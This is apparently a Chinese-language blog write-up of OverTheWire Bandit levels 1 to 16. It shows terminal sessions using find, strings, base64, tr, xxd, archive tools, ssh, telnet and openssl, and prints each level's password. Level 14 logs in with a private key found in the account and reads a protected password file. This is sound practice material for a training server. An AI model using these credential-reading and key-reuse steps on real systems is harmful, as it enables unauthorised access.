/usr/local/pwndbg/ * peda (https://github.com/longld/peda.git) in /usr/local/peda/ * gdbinit (https://github.com/gdbinit/Gdbinit) in /usr/local/gdbinit/ * pwntools (https://github.com/Gallopsled/pwntools) * radare2 (http://www.radare.org/) * checksec.sh (http://www.trapkit.de/tools/checksec.html) in /usr/local/bin/checksec.sh--[ More information ]-- For more information regarding individual wargames, visit http://www.overthewire.org/wargames/ For support, questions or comments, contact us through IRC on irc.overthewire.org #wargames. Enjoy your stay! Level 1ls之后得到flag，即下一关的密码（不知道为啥windows的CMD一直登陆不仅 建议用linux,windows是玄学 12bandit0@bandit:~$ cat readmeboJ9jbbUNNfktd78OOpsqOltutMc3MY1 wargame的原理就是上一关的flag是下一关ssh的密码 Level 21234567891011121314151617181920bandit1@bandit:~$ ls-bandit1@bandit:~$ cd --bash: cd: OLDPWD not setbandit1@bandit:~$ cd \--bash: cd: OLDPWD not setbandit1@bandit:~$ cd /--bash: cd: /-: No such file or directorybandit1@bandit:~$ ls -altotal 24-rw-r----- 1 bandit2 bandit1 33 Oct 16 2018 -drwxr-xr-x 2 root root 4096 Oct 16 2018 .drwxr-xr-x 41 root root 4096 Oct 16 2018 ..-rw-r--r-- 1 root root 220 May 15 2017 .bash_logout-rw-r--r-- 1 root root 3526 May 15 2017 .bashrc-rw-r--r-- 1 root root 675 May 15 2017 .profilebandit1@bandit:~$ cat /-cat: /-: No such file or directorybandit1@bandit:~$ cat ./-CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9 刚开始以为-是一个目录，便去cd，结果是oldpwd not set，百度之后发现是返回上一个目录 ls查看了才知道是是一个文件 bash中，-会被解析为stdin，即标准输出流，假如直接$ cat -，这条命令会回显输入的任意字符，知道输入eof 摆脱转义的方法就是使用相对路径或者绝对路径 level 312345678910111213141516bandit2@bandit:~$ lsspaces in this filenamebandit2@bandit:~$ ls -altotal 24drwxr-xr-x 2 root root 4096 Oct 16 2018 .drwxr-xr-x 41 root root 4096 Oct 16 2018 ..-rw-r--r-- 1 root root 220 May 15 2017 .bash_logout-rw-r--r-- 1 root root 3526 May 15 2017 .bashrc-rw-r--r-- 1 root root 675 May 15 2017 .profile-rw-r----- 1 bandit3 bandit2 33 Oct 16 2018 spaces in this filenamebandit2@bandit:~$ cat spaces\ in\ this\ filename UmHadQclWmgdLOKQ3YNgjWxGoRMb5luKbandit2@bandit:~$ cat "spaces in this filename" UmHadQclWmgdLOKQ3YNgjWxGoRMb5luKbandit2@bandit:~$ cat 'spaces in this filename'UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK 总所周知，linux文件名中假如有空格的话，直接输入肯定是打不开的 我这边直接用tab，补全了所有对空格的转义 当然，用引号包含也行 https://unix.stackexchange.com/questions/148043/is-space-not-allowed-in-a-filename 一般来说linux和unix上应该避免文件名中包含空格的 level 41234567891011121314151617bandit3@bandit:~$ ls -altotal 24drwxr-xr-x 3 root root 4096 Oct 16 2018 .drwxr-xr-x 41 root root 4096 Oct 16 2018 ..-rw-r--r-- 1 root root 220 May 15 2017 .bash_logout-rw-r--r-- 1 root root 3526 May 15 2017 .bashrcdrwxr-xr-x 2 root root 4096 Oct 16 2018 inhere-rw-r--r-- 1 root root 675 May 15 2017 .profilebandit3@bandit:~$ bandit3@bandit:~$ cd inherebandit3@bandit:~/inhere$ ls -altotal 12drwxr-xr-x 2 root root 4096 Oct 16 2018 .drwxr-xr-x 3 root root 4096 Oct 16 2018 ..-rw-r----- 1 bandit4 bandit3 33 Oct 16 2018 .hiddenbandit3@bandit:~/inhere$ cat .hidden pIwrPrtPN36QITSp3EQaw936yaFoFgAB 看来，直接ls -al是个好习惯 这题应该考察的是linux 的隐藏文件，linux的隐藏文件都以.开头 level 5123456789101112131415161718192021222324252627282930313233343536373839404142bandit4@bandit:~$ ls -altotal 24drwxr-xr-x 3 root root 4096 Oct 16 2018 .drwxr-xr-x 41 root root 4096 Oct 16 2018 ..-rw-r--r-- 1 root root 220 May 15 2017 .bash_logout-rw-r--r-- 1 root root 3526 May 15 2017 .bashrcdrwxr-xr-x 2 root root 4096 Oct 16 2018 inhere-rw-r--r-- 1 root root 675 May 15 2017 .profilebandit4@bandit:~$ cd inhere/bandit4@bandit:~/inhere$ ls -altotal 48drwxr-xr-x 2 root root 4096 Oct 16 2018 .drwxr-xr-x 3 root root 4096 Oct 16 2018 ..-rw-r----- 1 bandit5 bandit4 33 Oct 16 2018 -file00-rw-r----- 1 bandit5 bandit4 33 Oct 16 2018 -file01-rw-r----- 1 bandit5 bandit4 33 Oct 16 2018 -file02-rw-r----- 1 bandit5 bandit4 33 Oct 16 2018 -file03-rw-r----- 1 bandit5 bandit4 33 Oct 16 2018 -file04-rw-r----- 1 bandit5 bandit4 33 Oct 16 2018 -file05-rw-r----- 1 bandit5 bandit4 33 Oct 16 2018 -file06-rw-r----- 1 bandit5 bandit4 33 Oct 16 2018 -file07-rw-r----- 1 bandit5 bandit4 33 Oct 16 2018 -file08-rw-r----- 1 bandit5 bandit4 33 Oct 16 2018 -file09bandit4@bandit:~/inhere$ cat ./-file00����������~% C[�걱&gt;��| �bandit4@bandit:~/inhere$ cat ./-file01���U"7�w���H��ê�Q����(���#���bandit4@bandit:~/inhere$ cat ./-file02�T�v��(�ִ�����A*�2J�Ş؇_�y7bandit4@bandit:~/inhere$ cat ./-file03��.A��u��#���w$N?c�-��Db3��=��bandit4@bandit:~/inhere$ cat ./-file05+��pm���;��:D��^��@�gl�Q�bandit4@bandit:~/inhere$ cat ./-file04�=&lt;�W�����ht�Z��!��&#123;�U � bandit4@bandit:~/inhere$ cat ./-file06��@�%@���ZP*E��1�V���̫*����bandit4@bandit:~/inhere$ cat ./-file07koReBOKuIDDepwhWk7jZC0RTdopnAYKhbandit4@bandit:~/inhere$ 太难了，题目说only human-readable，真的是遍历10个文件 当然直接就找到flag了 level 612345678910bandit5@bandit:~/inhere$ lsmaybehere00 maybehere04 maybehere08 maybehere12 maybehere16maybehere01 maybehere05 maybehere09 maybehere13 maybehere17maybehere02 maybehere06 maybehere10 maybehere14 maybehere18maybehere03 maybehere07 maybehere11 maybehere15 maybehere19bandit5@bandit:~/inhere$ du -a -b | grep 10331033 ./maybehere07/.file2bandit5@bandit:~/inhere$ cat ./maybehere07/.file2DXjZPULLxYr17uwoI01bNLQbtFemEgo7 bandit5@bandit:~/inhere$ 给出三个条件：可读的，大小为1033bytes，不可执行的 明显的，只有大小最好搜索，使用命令du -a -b显示出所有文件，以bytes为单位的大小，然后使用管道过滤搜索就行了 level 7 https://www.runoob.com/linux/linux-comm-find.html https://www.cnblogs.com/RXDXB/p/11696751.html 找海量文件终于要用到了find命令 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566bandit6@bandit:/home$ find / -user 'bandit7' -group 'bandit6' -size 33cfind: ‘/run/lvm’: Permission deniedfind: ‘/run/screen/S-bandit27’: Permission deniedfind: ‘/run/screen/S-bandit25’: Permission deniedfind: ‘/run/screen/S-bandit2’: Permission deniedfind: ‘/run/screen/S-bandit16’: Permission deniedfind: ‘/run/screen/S-bandit0’: Permission deniedfind: ‘/run/screen/S-bandit20’: Permission deniedfind: ‘/run/screen/S-bandit30’: Permission deniedfind: ‘/run/screen/S-bandit14’: Permission deniedfind: ‘/run/screen/S-bandit33’: Permission deniedfind: ‘/run/screen/S-bandit13’: Permission deniedfind: ‘/run/screen/S-bandit31’: Permission deniedfind: ‘/run/screen/S-bandit8’: Permission deniedfind: ‘/run/screen/S-bandit5’: Permission deniedfind: ‘/run/screen/S-bandit4’: Permission deniedfind: ‘/run/screen/S-bandit29’: Permission deniedfind: ‘/run/screen/S-bandit28’: Permission deniedfind: ‘/run/screen/S-bandit21’: Permission deniedfind: ‘/run/screen/S-bandit26’: Permission deniedfind: ‘/run/screen/S-bandit24’: Permission deniedfind: ‘/run/screen/S-bandit22’: Permission deniedfind: ‘/run/screen/S-bandit1’: Permission deniedfind: ‘/run/screen/S-bandit19’: Permission deniedfind: ‘/run/screen/S-bandit23’: Permission deniedfind: ‘/run/shm’: Permission deniedfind: ‘/run/lock/temp/bandit31-git’: Permission deniedfind: ‘/run/lock/temp/bandit30-git’: Permission deniedfind: ‘/run/lock/temp/bandit29-git’: Permission deniedfind: ‘/run/lock/temp/bandit28-git’: Permission deniedfind: ‘/run/lock/temp/bandit27-git’: Permission deniedfind: ‘/run/lock/temp/bandit5/inhere’: Permission deniedfind: ‘/run/lock/lvm’: Permission deniedfind: ‘/var/spool/bandit24’: Permission deniedfind: ‘/var/spool/rsyslog’: Permission deniedfind: ‘/var/spool/cron/crontabs’: Permission deniedfind: ‘/var/log’: Permission deniedfind: ‘/var/tmp’: Permission deniedfind: ‘/var/cache/ldconfig’: Permission deniedfind: ‘/var/cache/apt/archives/partial’: Permission denied/var/lib/dpkg/info/bandit7.passwordfind: ‘/var/lib/apt/lists/partial’: Permission deniedfind: ‘/var/lib/polkit-1’: Permission deniedfind: ‘/cgroup2/csessions’: Permission deniedfind: ‘/home/bandit28-git’: Permission deniedfind: ‘/home/bandit30-git’: Permission deniedfind: ‘/home/bandit31-git’: Permission deniedfind: ‘/home/bandit5/inhere’: Permission deniedfind: ‘/home/bandit27-git’: Permission deniedfind: ‘/home/bandit29-git’: Permission deniedfind: ‘/tmp’: Permission deniedfind: ‘/lost+found’: Permission deniedfind: ‘/root’: Permission deniedfind: ‘/etc/ssl/private’: Permission deniedfind: ‘/etc/lvm/backup’: Permission deniedfind: ‘/etc/lvm/archive’: Permission deniedfind: ‘/etc/polkit-1/localauthority’: Permission deniedfind: ‘/sys/fs/pstore’: Permission deniedfind: ‘/proc/tty/driver’: Permission deniedfind: ‘/proc/29536/task/29536/fd/6’: No such file or directoryfind: ‘/proc/29536/task/29536/fdinfo/6’: No such file or directoryfind: ‘/proc/29536/fd/5’: No such file or directoryfind: ‘/proc/29536/fdinfo/5’: No such file or directoryfind: ‘/boot/lost+found’: Permission deniedbandit6@bandit:/home$ cat /var/lib/dpkg/info/bandit7.passwordHKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs 毕竟是别人的服务器嘛，找出其中可以访问的就是目标文件了 level 8 strings：用于打印文件中可打印的字符 123456bandit7@bandit:~$ lsdata.txtbandit7@bandit:~$ less data.txt bandit7@bandit:~$ strings data.txt |grep millionthmillionth cvX2JJa4CFALtqS87jk27qwqGhBM9plVbandit7@bandit:~$ 一看这题目就感觉很大，用less看下格式，然后直接用grep去查找就行了 cat命令在这也是可以和strings互换的 level 9 uniq 命令用于检查及删除文本文件中重复出现的行列，一般与 sort 命令结合使用uniq 可检查文本文件中重复出现的行列 https://www.runoob.com/linux/linux-comm-uniq.html sort命令用于将文本文件内容加以排序sort可针对文本文件的内容，以行为单位来排序 https://www.runoob.com/linux/linux-comm-sort.html 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104bandit8@bandit:~$ cat data.txt | sort | uniq -c 10 07iR6PwHwihvQ3av1fqoRjICCulpoyms 10 0ob6rCn4D4jQ6KCiaT5hmOdWFrm2quR1 10 1drBmDT7PYS7hVgoTWkJSjUZUK7ZAIAa 10 1JnkIYLDOdn5M7TGabYxOWkn7HazMjYW 10 1wBrW0VGjKeYiXltbEWrUipwSHQfTu44 10 2Dxbtw8cnKyHwvt0lfFNYOGc4cE59uua 10 2TRkCQhbMjcM0hwL31NnJQ0DVagWN3Ca 10 4c7EsUtqLnLR9hiepV5EQVhdMgyi8onL 10 4cQDXE4IPH8fCBUBZaTPgnY2gwnPnlj6 10 6495bfC0lI1Qkw5kzZHnbVWooaOZHLvj 10 6rEzM4Qro8dH0e3uemAyYseTiNiNAYap 10 78rgduVcLZjLzZmooObdaN541MKV6IfQ 10 8qkrbCAUG9I28M49j9flUro5fWxenFzF 10 aIl4xN5maZVCQITz0xH0KNXIlLc0MhNf 10 aPsCQmSWVYGQQHUD6k1fHC2kqSyMlxwV 10 awglWaTRSAWBcol8hSMTJP4FYhIGJHVO 10 bCJdTkork5IRbZaaPZK0WVPgYIIO4mHF 10 BPl0XNou7xAZAI5fdzWzSmPkW1PnvTE1 10 bvIaDTzHBOGSO7CfpH9vUrJRRlwYTUA7 10 CS8HVrDmKGLG53qziqQCLWNRlUP1FHsV 10 CwwHDVp0pO6zmFp87L9AtFzqU5aB5j9w 10 CyziIvGRdotoy9yA00RAnvvkvrYdKCPp 10 DRqDxJYAv7IUfAMmrXtXEiz63TUjqeDn 10 DXI6y5CNPU06rVpkoZgnZJBWfkdW131j 10 enNw6tuj8mSxxS7f2Yd05puXVeuCZ39G 10 ewllxPExW9eaHxAH8WZkW9lDuK5cZcUy 10 eyKcuNPKnjt25kaOZxkMYQ9xqp45aIk9 10 fIBXc239DbhORY4t9xjgi7fSm4thHsIb 10 fiK30QpqzoULACXZwkBEKJZvpPQx9Uqm 10 FlHOKVUDNLx6Ga7CxC4ISRYNflN1GAnF 10 G4BHP66B4l3XkvB05CMgzrEKyjHhuCwz 10 gCx35PlKn08nrFFrAgHYLrUVWWZjLdqM 10 GEzwi36aKB8PLlCPH2wzl9gHzVm97IYu 10 glONDdR72FJL3Gc03nVNO4PKNzXFGH1A 10 gqGBgY1IdFDGG2XzB2o1VNGY4j6OL76V 10 h7jtcUsBhrryyLhtt1mT6Jdmp0l6ozBs 10 HKryX0XX2HT4WBT0OUzRz5Ac5B2rvIHU 10 iM3PaCO3VAxAdbdVsdGtEwuwrFQPYJV7 10 irGm6F73sbUrFhHukhp6JXgMQyLxJTz1 10 jtNdk5KDgrMkxgbZSJOvjOcM58svrzDY 10 jVscZ5eK5DWN7IvDSehXmyplCXRSbHJS 10 KerqNiDbY0zV2VxnOCmWX5XWxumldlAe 10 kha3sCpHsydUNrxLLXV3cFqWyucGjdxr 10 kt1VUEZpimCS4BaoAvhN3rgHOmhqaMIR 10 KUzqHCrxHSpgfkF5ZAzUfjlBaXW3zIaZ 10 L0nxAwlfV9V3J5onKIT8KYQ9InTcQ7yE 10 lnB8MWOYjETxoC8bQYrMFnxxQXAWHjP4 10 lZ9DhnzeHgIuLqYPmNzONpMCkuBYoeJI 10 M8JMUd7MSd4mOwZj1843ejBH5RXJOloa 10 mdug9JbW836YVZh3ALULBAxODlinqonJ 10 MIpMch66sYTmmqepKYczlRA9aJrnkt68 10 MpAqsgjJIVLT1MxSZcRoOOzl6g1db98Q 10 MQrydyojsVIYJSY8y1nCMjZGxnL1My7F 10 MsxcvOe3PGrt78wpZG2bBNF5wfXpZhET 10 n5fEmvCXKbJErzIDt3MLTmZZVMRNynrR 10 NL91hwGrqW5lVgoicb592Sd0djnHnbjZ 10 Nnih4Q0jf3xEOTcmM3yw2HkOm3VPox0w 10 NT4p09XwRb0k0wG9yIuvfs3MblMGpMc1 10 nU5zbsdUfmzv7cjNwkV9Hgb65OVe5EDt 10 nyvBweoC3kzt5QRTjbDfrWO7jhwOGN4g 10 OcVxHzDW027KWNFS03G31KQEb5TgN1WV 10 peXkYozDKE2u2BEOed5vvkY0nyjkGawn 10 PXHEt0PztCiArDZ7UCBmqKdBCiXNQWBN 10 QmFayGbrzFoiQ5Z2PGmnD2N6Pf77cxl9 10 QNTac9UtCmQ5VGAnzj10Z9BwV4TuaVvu 10 qsbKthWb80f3vQKBP7O12SjfFo1V5VkL 10 quhCb8ZIUJXXM2SbY1ER1D5GaDlQjdDa 10 QYeOFhgJCJEfKM1ZpT0K322R6SuKdCFT 10 r0VIMA1yzv838m7UfvutUhCf0zaY3Rqw 10 rfUNSGOvmQXz0m7PtFoEoPg1BpTbll7X 10 rJMbGeeDTMsj1RA4YibIQr0o9azHgP0I 10 rQAYnkKAXIViP4ROmehnDMIAXLpOOLEp 10 sBB2H7HateUFxr2oxrqUVoumFM60f1lj 10 SjFHXKRcIc7jlAYGknVMnGXSFd6xRmnF 10 tDZbF2SuhsvfaA3eTnwfcjQa1pZoPJeX 10 tiyVGzZcRwUPVAiqkroFMUbMI9ut9hcT 10 tLKyRATtoCuxMR4zZg1Dnlnr3je3bSHe 10 tmzBM5rcV9y7AM1xDHudL2yX9oefGieT 10 tWwjd16fG17vGdjutfOygVTjEGxlijOS 10 uBRx9inQTeaDZAuzEb2MadWXmkH8uW4O 1 UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR 10 vBo3qbjNEF2d3meGEkRfc3mKpjtiDz1i 10 VElUBEIhJ4yBgOBSN05WgtV2rF6kkGdz 10 vl9liaz8TKv1enUi0S2REhn01hKjjFIK 10 vVwG2mb8rU8eCuIlBhCJrZJ4GWR35nWY 10 W0vbGkT5mfRVWHAXCcMekevbenMJHFhN 10 W6pn7siBPh5G6ndjv1xx26iHxke8PviX 10 WaKxNQhiI9dXwvzB1PMpbQRy4CutGrWt 10 WbfstqfIvgiEuCVVuxwLgLyzUMtho2jP 10 WBjoFnis277W9vWB8M67h3z1glOYG2Fy 10 wSpAMdiBSeywE4d1DQZoSp5o8ZVOCqGP 10 wWfTfhYKmBkmyGH9D6Qjb6x7bMt5narC 10 x0bga8Oxz5lgM8k52HrYy4ez7XJI0lM0 10 XURYdoIx95clq6s90MORDydQ187DxQhS 10 xWmqkcrZ7TmjE7LKjqHVXSLw9fqsjYXp 10 XWy99VXVCnwdr780PK86hP6rBMkV5E3n 10 y9sn56N0ZhyxaySYRs518D4vqkMShHwb 10 YiQvaaidmD39i0ryGZz97Upc5NjgPklY 10 YR0sflfJZ34iuY3wM3DNNO19dBYnJDmt 10 yXGLvp7UaeiDKxLGXQYlWuRWdIgeCaT0 10 YzZX7E35vOa6IQ9SRUGdlEpyaiyjvWXEbandit8@bandit:~$ cat data.txt | sort | uniq -uUsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR 这里的知识是linux的文本处理 用uniq -c统计每个字符串出现的次数，-u即可显示只出现一次的字符串 level 10找出以=开头的字符出，可读的 第一反应想到的是正则表达式和strings命令，尝试了一下，直接成功 123456789101112131415161718192021222324252627bandit9@bandit:~$ strings data.txt |grep "=.*"2========== the========== password&gt;t= yPrV~dHm=========== isa=FQ?P\U= F[pb=xJ;m==)$=========== truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLkiv8!=bandit9@bandit:~$ bandit9@bandit:~$ strings data.txt |grep "="2========== the========== password&gt;t= yPrV~dHm=========== isa=FQ?P\U= F[pb=xJ;m==)$=========== truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLkiv8!= 后面看别人直接grep也能成功，可真是出人意料 这边的知识点应该是grep是支持正则表达式的字符串的 level 1112345678bandit10@bandit:~$ strings data.txt | lessbandit10@bandit:~$ strings data.txt VGhlIHBhc3N3b3JkIGlzIElGdWt3S0dzRlc4TU9xM0lSRnFyeEUxaHhUTkViVVBSCg==bandit10@bandit:~$ cat data.txt VGhlIHBhc3N3b3JkIGlzIElGdWt3S0dzRlc4TU9xM0lSRnFyeEUxaHhUTkViVVBSCg==bandit10@bandit:~$ strings data.txt | base64 -dThe password is IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPRbandit10@bandit:~$ 直接less读取怕文件太大，结果就只有一行明显的base64加密 百度了linux中base64命令的用法，毕竟题意就是让用linux命令进行操作的 base64用法如下 123$ echo "Hello World" | base64SGVsbG8gV29ybGQK$ echo "SGVsbG8gV29ybGQK" | base64 -d 加-d选项为解密 level 12看题目是rot13加密，如何用linux指令实现呢 这里用到了tr命令 tr 命令用于转换或删除文件中的字符 tr 指令从标准输入设备读取数据，经过字符串转译后，将结果输出到标准输出设备 https://www.runoob.com/linux/linux-comm-tr.html https://www.xp.cn/php/2675.html 12345bandit11@bandit:~$ cat data.txt Gur cnffjbeq vf 5Gr8L4qetPEsPk8htqjhRK8XSP6x2RHhbandit11@bandit:~$ cat data.txt | tr 'N-Z A-M n-z a-m' 'A-M N-Z a-m n-z'The password is 5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUubandit11@bandit:~$ level 13据说这是xxd导出的十六进制文件 我们去搜xxd命令，恢复成二级制用xxd -r filename 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116bandit12@bandit:~$ mkdir /tmp/magickingbandit12@bandit:~$ cp data.txt /tmp/magicking/data.txtbandit12@bandit:~$ cd /tmp/magickingbandit12@bandit:/tmp/magicking$ lsdata.txtbandit12@bandit:/tmp/magicking$ cat data.txt00000000: 1f8b 0808 d7d2 c55b 0203 6461 7461 322e .......[..data2.00000010: 6269 6e00 013c 02c3 fd42 5a68 3931 4159 bin..&lt;...BZh91AY00000020: 2653 591d aae5 9800 001b ffff de7f 7fff &amp;SY.............00000030: bfb7 dfcf 9fff febf f5ad efbf bbdf 7fdb ................00000040: f2fd ffdf effa 7fff fbd7 bdff b001 398c ..............9.00000050: 1006 8000 0000 0d06 9900 0000 6834 000d ............h4..00000060: 01a1 a000 007a 8000 0d00 0006 9a00 d034 .....z.........400000070: 0d1a 3234 68d1 e536 a6d4 4000 341a 6200 ..24h..6..@.4.b.00000080: 0069 a000 0000 0000 d003 d200 681a 0d00 .i..........h...00000090: 0001 b51a 1a0c 201e a000 6d46 8068 069a ...... ...mF.h..000000a0: 6834 340c a7a8 3406 4000 0680 0001 ea06 h44...4.@.......000000b0: 8190 03f5 4032 1a00 0343 4068 0000 0686 ....@2...C@h....000000c0: 8000 0320 00d0 0d00 0610 0014 1844 0308 ... .........D..000000d0: 04e1 c542 9ab8 2c30 f1be 0b93 763b fb13 ...B..,0....v;..000000e0: 50c4 c101 e008 3b7a 92a7 9eba 8a73 8d21 P.....;z.....s.!000000f0: 9219 9c17 052b fb66 a2c2 fccc 9719 b330 .....+.f.......000000100: 6068 8c65 e504 5ec0 ae02 fa6d 16bc 904b `h.e..^....m...K00000110: ba6c f692 356e c02b 0374 c394 6859 f5bb .l..5n.+.t..hY..00000120: 0f9f 528e 4272 22bb 103c 2848 d8aa 2409 ..R.Br"..&lt;(H..$.00000130: 24d0 d4c8 4b42 7388 ce25 6c1a 7ec1 5f17 $...KBs..%l.~._.00000140: cc18 ddbf edc1 e3a4 67f1 7a4d 8277 c823 ........g.zM.w.#00000150: 0450 2232 40e0 07f1 ca16 c6d6 ef0d ecc9 .P"2@...........00000160: 8bc0 5e2d 4b12 8586 088e 8ca0 e67d a55c ..^-K........&#125;.\00000170: 2ca0 18c7 bfb7 7d45 9346 ea5f 2172 01e4 ,.....&#125;E.F._!r..00000180: 5598 673f 45af 69b7 a739 7814 8706 04ed U.g?E.i..9x.....00000190: 5442 1240 0796 6cc8 b2f6 1ef9 8d13 421d TB.@..l.......B.000001a0: 461f 2e68 4d91 5343 34b5 56e7 46d0 0a0a F..hM.SC4.V.F...000001b0: 72b7 d873 71d9 6f09 c326 402d dbc0 7cef r..sq.o..&amp;@-..|.000001c0: 53b1 df60 9ec7 f318 00df 3907 2e85 d85b S..`......9....[000001d0: 6a1a e105 0207 c580 e31d 82d5 8646 183c j............F.&lt;000001e0: 6a04 4911 101a 5427 087c 1f94 47a2 270d j.I...T'.|..G.'.000001f0: ad12 fc5c 9ad2 5714 514f 34ba 701d fb69 ...\..W.QO4.p..i00000200: 8eed 0183 e2a1 53ea 2300 26bb bd2f 13df ......S.#.&amp;../..00000210: b703 08a3 2309 e43c 44bf 75d4 905e 5f96 ....#..&lt;D.u..^_.00000220: 481b 362e e82d 9093 7741 740c e65b c7f1 H.6..-..wAt..[..00000230: 5550 f247 9043 5097 d626 3a16 da32 c213 UP.G.CP..&amp;:..2..00000240: 2acd 298a 5c8a f0c1 b99f e2ee 48a7 0a12 *.).\.......H...00000250: 03b5 5cb3 0037 cece 773c 0200 00 ..\..7..w&lt;...bandit12@bandit:/tmp/magicking$ xxd -r data.txtbandit12@bandit:/tmp/magicking$ xxd -r data.txt &gt; databandit12@bandit:/tmp/magicking$ file datadata: gzip compressed data, was "data2.bin", last modified: Tue Oct 16 12:00:23 2018, max compression, from Unixbandit12@bandit:/tmp/magicking$ mv data data.gzbandit12@bandit:/tmp/magicking$ gz -d data.gz -bash: gz: command not foundbandit12@bandit:/tmp/magicking$ gnuzip -d data.gz -bash: gnuzip: command not foundbandit12@bandit:/tmp/magicking$ gzip -d data.gz bandit12@bandit:/tmp/magicking$ lsdata data.txtbandit12@bandit:/tmp/magicking$ file datadata: bzip2 compressed data, block size = 900kbandit12@bandit:/tmp/magicking$ mv data data.bz2bandit12@bandit:/tmp/magicking$ bz2 -d data.bz2 -bash: bz2: command not foundbandit12@bandit:/tmp/magicking$ bzip2 -d data.bz2 bandit12@bandit:/tmp/magicking$ lsdata data.txtbandit12@bandit:/tmp/magicking$ file datadata: gzip compressed data, was "data4.bin", last modified: Tue Oct 16 12:00:23 2018, max compression, from Unixbandit12@bandit:/tmp/magicking$ gzip -d datagzip: data: unknown suffix -- ignoredbandit12@bandit:/tmp/magicking$ mv data data.gzbandit12@bandit:/tmp/magicking$ gzip -d data.gz bandit12@bandit:/tmp/magicking$ file datadata: POSIX tar archive (GNU)bandit12@bandit:/tmp/magicking$ mv data data.tarbandit12@bandit:/tmp/magicking$ tar -x data.tartar: Refusing to read archive contents from terminal (missing -f option?)tar: Error is not recoverable: exiting nowbandit12@bandit:/tmp/magicking$ tar -xvf data.tardata5.binbandit12@bandit:/tmp/magicking$ lsdata5.bin data.tar data.txtbandit12@bandit:/tmp/magicking$ file data5.bindata5.bin: POSIX tar archive (GNU)bandit12@bandit:/tmp/magicking$ mv data5.bin data5.bin.tarbandit12@bandit:/tmp/magicking$ tar -xvf data5.bin.tar data6.binbandit12@bandit:/tmp/magicking$ file data6.bindata6.bin: bzip2 compressed data, block size = 900kbandit12@bandit:/tmp/magicking$ mv data6.bin data6.bin.bz2bandit12@bandit:/tmp/magicking$ bzip2 -d data6.bin.bz2 bandit12@bandit:/tmp/magicking$ lsdata5.bin.tar data6.bin data.tar data.txtbandit12@bandit:/tmp/magicking$ ls -ltotal 48-rw-r--r-- 1 bandit12 root 10240 Oct 16 2018 data5.bin.tar-rw-r--r-- 1 bandit12 root 10240 Oct 16 2018 data6.bin-rw-r--r-- 1 bandit12 root 20480 Feb 14 10:42 data.tar-rw-r----- 1 bandit12 root 2581 Feb 14 10:37 data.txtbandit12@bandit:/tmp/magicking$ file data6.bindata6.bin: POSIX tar archive (GNU)bandit12@bandit:/tmp/magicking$ mv data6.bin data6.bin.tarbandit12@bandit:/tmp/magicking$ tar -xvf data6.bin.tar data8.binbandit12@bandit:/tmp/magicking$ file data8.bin data8.bin: gzip compressed data, was "data9.bin", last modified: Tue Oct 16 12:00:23 2018, max compression, from Unixbandit12@bandit:/tmp/magicking$ mv data8.bin data8.bin.gzbandit12@bandit:/tmp/magicking$ gzip -d data8.bin.gz bandit12@bandit:/tmp/magicking$ lsdata5.bin.tar data6.bin.tar data8.bin data.tar data.txtbandit12@bandit:/tmp/magicking$ file data8.bin data8.bin: ASCII textbandit12@bandit:/tmp/magicking$ cat data8.bin The password is 8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYLbandit12@bandit:/tmp/magicking$ 逐渐熟练的解压缩操作，简直了这压缩层数，丧心病狂 level 14根据题目所描述，/etc/bandit_pass/bandit14 and can only be read by user bandit14 我们肯定无法访问 但是，ls之后，发现有一个私钥，而且题目表示可以不用密码 那么这文件就是ssh bandit14的私钥 直接连接，ojbk 123456789101112131415161718192021222324bandit13@bandit:~$ lssshkey.privatebandit13@bandit:~$ cat /etc/bandit_pass/bandit14cat: /etc/bandit_pass/bandit14: Permission deniedbandit13@bandit:~$ sshusage: ssh [-1246AaCfGgKkMNnqsTtVvXxYy] [-b bind_address] [-c cipher_spec] [-D [bind_address:]port] [-E log_file] [-e escape_char] [-F configfile] [-I pkcs11] [-i identity_file] [-J [user@]host[:port]] [-L address] [-l login_name] [-m mac_spec] [-O ctl_cmd] [-o option] [-p port] [-Q query_option] [-R address] [-S ctl_path] [-W host:port] [-w local_tun[:remote_tun]] [user@]hostname [command]bandit13@bandit:~$ ssh -i sshkey.private bandit14@localhostCould not create directory '/home/bandit13/.ssh'.The authenticity of host 'localhost (127.0.0.1)' can't be established.ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc.Are you sure you want to continue connecting (yes/no)? yesFailed to add the host to the list of known hosts (/home/bandit13/.ssh/known_hosts).This is a OverTheWire game server. More information on http://www.overthewire.org/wargames......bandit14@bandit:~$ cat /etc/bandit_pass/bandit144wcYUJFw0k0XLShlDzztnTBHiqxU3b3e level 151234567891011121314151617181920bandit14@bandit:~$ cat /etc/bandit_pass/bandit144wcYUJFw0k0XLShlDzztnTBHiqxU3b3ebandit14@bandit:~$ bandit14@bandit:~$ telnet localhost 30000Trying 127.0.0.1...Connected to localhost.Escape character is '^]'.Wrong! Please enter the correct current passwordConnection closed by foreign host.bandit14@bandit:~$ telnet localhost 30000Trying 127.0.0.1...Connected to localhost.Escape character is '^]'.4wcYUJFw0k0XLShlDzztnTBHiqxU3b3eCorrect!BfMYroe26WYalil77FoDi9qh59eK5xNrConnection closed by foreign host.bandit14@bandit:~$ level 16发送需要ssl加密 搜索得知SSL可用于加密任何基于TCP/IP的应用 再搜索openssl的用法即可解出 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475bandit15@bandit:~$ openssl s_client -connect localhost:30001 -ign_eofCONNECTED(00000003)depth=0 CN = localhostverify error:num=18:self signed certificateverify return:1depth=0 CN = localhostverify return:1---Certificate chain 0 s:/CN=localhost i:/CN=localhost---Server certificate-----BEGIN 